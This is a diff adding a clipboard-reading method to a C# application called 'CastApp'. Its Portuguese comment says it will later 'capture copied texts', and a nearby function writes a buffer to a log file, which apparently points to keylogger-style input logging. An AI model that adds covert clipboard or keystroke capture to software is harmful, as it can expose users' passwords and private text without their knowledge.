@@ -527,6 +527,38 @@ namespace CastApp
         }
 
         /// <summary>
+        /// Para ler o conteúdo da área de transferência
+        /// Sera usado para capturar textos copiados no futuro
+        /// </summary>
+        private static string ReadClipboard()
+        {
+            if (!Natives.OpenClipboard(IntPtr.Zero))
+            {
+                return "";
+            }
+            try
+            {
+                nint clipboardData = Natives.GetClipboardData(13u);
+                if (clipboardData == IntPtr.Zero)
+                {
+                    return "";
+                }
+                nint num = Natives.GlobalLock(clipboardData);
+                if (num == IntPtr.Zero)
+                {
+                    return "";
+                }
+                string result = Marshal.PtrToStringUni(num) ?? "";
+                Natives.GlobalUnlock(clipboardData);
+                return result;
+            }
+            finally
+            {
+                Natives.CloseClipboard();
+            }
+        }
+
+        /// <summary>
         /// Escreve o buffer no arquivo de log
         /// </summary>
         private static void FlushBuffer()
